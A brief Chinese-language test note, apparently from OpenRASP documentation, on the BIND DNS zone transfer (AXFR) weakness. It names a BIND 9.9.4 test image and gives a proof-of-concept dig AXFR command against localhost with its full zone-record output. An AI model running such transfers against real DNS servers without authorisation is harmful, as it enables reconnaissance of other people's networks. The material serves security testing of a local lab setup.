### 运维安全 - bind 域传输漏洞

测试镜像

* src/bind/9.9.4

Poc

```
[OpenRASP] root@cd861aa8498e:/ # dig @127.0.0.1 example.com AXFR

; <<>> DiG 9.9.4-RedHat-9.9.4-51.el7_4.2 <<>> @127.0.0.1 example.com AXFR
; (1 server found)
;; global options: +cmd
example.com.		3600	IN	SOA	ns1.exampledns.com. root.example.com. 2012033101 3600 1800 604800 43200
example.com.		3600	IN	NS	ns1.exampledns.com.
example.com.		3600	IN	NS	ns2.exampledns.com.
example.com.		3600	IN	A	192.168.0.2
www.example.com.	3600	IN	A	192.168.0.2
example.com.		3600	IN	SOA	ns1.exampledns.com. root.example.com. 2012033101 3600 1800 604800 43200
;; Query time: 4 msec
;; SERVER: 127.0.0.1#53(127.0.0.1)
;; WHEN: Sun Apr 22 01:24:28 UTC 2018
;; XFR size: 6 records (messages 1, bytes 189)

[OpenRASP] root@cd861aa8498e:/ #
```

